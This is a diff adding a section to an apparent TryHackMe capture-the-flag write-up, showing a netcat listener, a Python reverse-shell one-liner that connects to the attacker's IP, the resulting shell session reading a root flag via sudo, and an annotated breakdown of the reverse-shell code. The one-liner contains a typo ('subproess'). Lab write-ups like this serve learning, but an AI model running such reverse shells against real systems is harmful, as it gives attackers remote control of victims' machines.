@@ -211,3 +211,69 @@ www-data                ALL=(ALL) NOPASSWD: ALL
 # See sudoers(5) for more information on "#include" directives:
 #includedir /etc/sudoers.d
 ```
+
+### [Another way]
+
+After looking on the internet, i know that there is another way to reverse shell and listen on netcat
+
+Open netcat to listen on port 1234
+
+```
+┌──(kali㉿kali)-[~/wordlists]
+└─$ nc -lvnp 1234                     
+listening on [any] 1234 ...
+```
+
+- Run this pythons script:
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_openvpn_ip_in_THM_network",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subproess.call(["/bin/bash","-i"]);'
+```
+
+⇒ It will open the bash shell to the ip that is in the internal THM network on port 1234 
+
+```
+┌──(kali㉿kali)-[~/wordlists]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.17.24.66] from (UNKNOWN) [10.10.231.188] 45268
+bash: cannot set terminal process group (1341): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-10-231-188:/var/www/html$ ls          
+ls
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+payload.php
+portal.php
+robots.txt
+www-data@ip-10-10-231-188:/var/www/html$ whoami
+whoami
+www-data
+www-data@ip-10-10-231-188:/var/www/html$ sudo cat /root/3rd.txt
+sudo cat /root/3rd.txt
+3rd ingredients: fleeb juice
+
+```
+
+[Explaination]
+
+```
+// socket for creating network connections, subprocess for executing cmd, os for low-level operating system operations.
+import socket,subprocess,os;
+// a new TCP socket (SOCK_STREAM) using the IPv4 address family (AF_INET).
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+// connect to the IP of attacker on port 1234  
+s.connect(("10.17.7.91",1234));
+// the dup2() function to duplicate the file descriptors for standard input (0), standard output (1), and standard error (2). 
+// They are redirected to the socket's file descriptor (s.fileno()) 
+=> allowing input, output and error to be sent over the network connection.
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+// it executes the Bash shell (/bin/bash) with the -i flag (interactive") 
+p = subprocess.call(["/bin/bash", "-i"])
+```
